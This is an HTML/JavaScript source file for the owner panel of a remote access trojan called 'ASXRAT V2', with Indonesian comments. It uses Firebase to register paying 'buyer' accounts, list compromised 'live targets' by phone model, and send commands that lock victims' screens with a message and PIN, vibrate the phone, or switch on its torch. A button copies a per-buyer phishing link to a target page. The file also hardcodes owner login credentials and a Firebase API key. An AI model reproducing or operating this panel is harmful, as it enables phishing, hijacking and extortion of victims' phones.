<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ASXRAT V2 | OWNER PANEL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --red: #ff0000; --bg: #000; --card: #111; }
        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
        
        #auth { position: fixed; inset: 0; background: var(--bg); z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 15px; }
        .banner-img { width: 100%; max-width: 420px; height: 160px; object-fit: cover; border: 2px solid var(--red); border-bottom: none; border-radius: 15px 15px 0 0; }
        .login-card { background: var(--card); padding: 25px; border: 2px solid var(--red); border-radius: 0 0 15px 15px; width: 100%; max-width: 420px; text-align: center; margin-top: -1px; box-sizing: border-box; }
        
        input { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: var(--red); border-radius: 8px; text-align: center; outline: none; font-weight: bold; box-sizing: border-box; }
        .btn-main { background: var(--red); color: #fff; border: none; padding: 15px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 10px; }

        #dash { display: none; padding: 15px; max-width: 500px; margin: auto; }
        .header-box { padding: 15px; border: 1px solid var(--red); border-radius: 12px; background: #0a0a0a; text-align: center; margin-bottom: 20px; }
        
        /* SECTION BUYER & TARGET */
        .section-title { color: var(--red); text-align: center; letter-spacing: 2px; margin: 20px 0 10px 0; font-size: 14px; border-bottom: 1px solid #222; padding-bottom: 5px; }
        .card { background: var(--card); border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 12px; border-left: 5px solid var(--red); }
        .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-top: 10px; }
        .btn-rat { background: #000; color: #fff; border: 1px solid var(--red); padding: 10px; font-size: 11px; border-radius: 6px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div id="auth">
        <img src="https://drive.google.com/uc?export=view&id=1vBE16nPKAsIaaKAuUMYg6GgP6Ue28_k7" class="banner-img">
        <div class="login-card">
            <p style="font-size:10px; color:#aaa;">ADMIN ACCESS : <span style="color:red">ELVOXI</span></p>
            <input type="text" id="email-input" placeholder="EMAIL ADDRESS...">
            <input type="password" id="key-input" placeholder="SECRET KEY...">
            <button onclick="login()" class="btn-main">LOGIN OWNER</button>
        </div>
    </div>

    <div id="dash">
        <div class="header-box">
            <b id="user-display" style="color:var(--red); font-size:16px;">...</b><br>
            <button class="btn-main" onclick="salinLink()" style="background:#fff; color:#000; margin-top:10px; height:45px;">📋 COPY MY LINK</button>
        </div>

        <div id="admin-only" style="display:none;">
            <div class="section-title">👤 REGISTER NEW BUYER</div>
            <div class="card" style="border-left-color: #00ff00;">
                <input type="text" id="reg-mail" placeholder="Buyer Email...">
                <input type="text" id="reg-key" placeholder="Buyer Secret Key...">
                <button onclick="addBuyer()" class="btn-main" style="background:#00ff00; color:#000;">➕ CREATE BUYER ACCOUNT</button>
            </div>
        </div>

        <div class="section-title">📡 LIVE TARGETS</div>
        <div id="list"><p style="text-align:center; color:#444;">No targets yet...</p></div>
    </div>

<script>
    const linkPhising = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html";
    const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let currentKey = "";

    function login() {
        const mail = document.getElementById('email-input').value;
        const key = document.getElementById('key-input').value;
        
        // Cek Login (Owner atau Buyer)
        if(mail === "elvoxi@gmail.com" && key === "elvoxi122") {
            currentKey = "elvoxi122";
            document.getElementById('admin-only').style.display = 'block'; // Munculin menu buyer
            start();
        } else {
            db.ref('asxrat/accounts/' + key).once('value', (s) => {
                if(s.exists() && s.val().email === mail) {
                    currentKey = key;
                    start();
                } else alert("AKUN TIDAK TERDAFTAR!");
            });
        }
    }

    // Fungsi Bikin Akun Buyer (Cuma Owner yang bisa)
    function addBuyer() {
        const bMail = document.getElementById('reg-mail').value;
        const bKey = document.getElementById('reg-key').value;
        if(!bMail || !bKey) return alert("Isi semua data!");
        
        db.ref('asxrat/accounts/' + bKey).set({
            email: bMail,
            role: "buyer",
            createdAt: Date.now()
        }).then(() => {
            alert("BUYER BERHASIL DITAMBAHKAN!");
            document.getElementById('reg-mail').value = "";
            document.getElementById('reg-key').value = "";
        });
    }

    function start() {
        document.getElementById('auth').style.display = 'none';
        document.getElementById('dash').style.display = 'block';
        document.getElementById('user-display').innerText = "LOGGED AS: " + currentKey;

        db.ref('mario/targets').on('value', (snap) => {
            const list = document.getElementById('list');
            list.innerHTML = "";
            let found = false;
            snap.forEach((child) => {
                const d = child.val();
                if(d.belongsTo === currentKey) {
                    found = true;
                    list.innerHTML += `
                        <div class="card">
                            <b style="color:red">📱 ${d.model}</b>
                            <div style="background:#000; padding:10px; border-radius:8px; margin-top:10px;">
                                <input type="text" id="msg-${child.key}" placeholder="Pesan Lock...">
                                <input type="text" id="pw-${child.key}" placeholder="Set PIN...">
                                <div class="btn-grid">
                                    <button class="btn-rat" onclick="sendLock('${child.key}')">🔒 LOCK</button>
                                    <button class="btn-rat" onclick="cmd('${child.key}', 'unlock')">🔓 UNLOCK</button>
                                </div>
                            </div>
                            <div class="btn-grid">
                                <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">📳 GETAR</button>
                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">🔦 SENTER</button>
                                <button class="btn-rat" onclick="db.ref('mario/targets/${child.key}').remove()">🗑️ HAPUS</button>
                            </div>
                        </div>`;
                }
            });
            if(!found) list.innerHTML = "<p style='text-align:center; color:#444;'>No targets found.</p>";
        });
    }

    function cmd(id, act) { db.ref('mario/commands/' + id).set({ action: act, time: Date.now() }); }
    function sendLock(id) {
        const m = document.getElementById('msg-'+id).value || "LOCKED";
        const p = document.getElementById('pw-'+id).value || "123";
        db.ref('mario/commands/' + id).set({ action: 'lock_screen', text: m, pass: p, time: Date.now() });
    }
    function salinLink() {
        const encoded = btoa(currentKey);
        navigator.clipboard.writeText(linkPhising + "?id=" + encoded);
        alert("LINK COPIED!");
    }
</script>
</body>
</html>
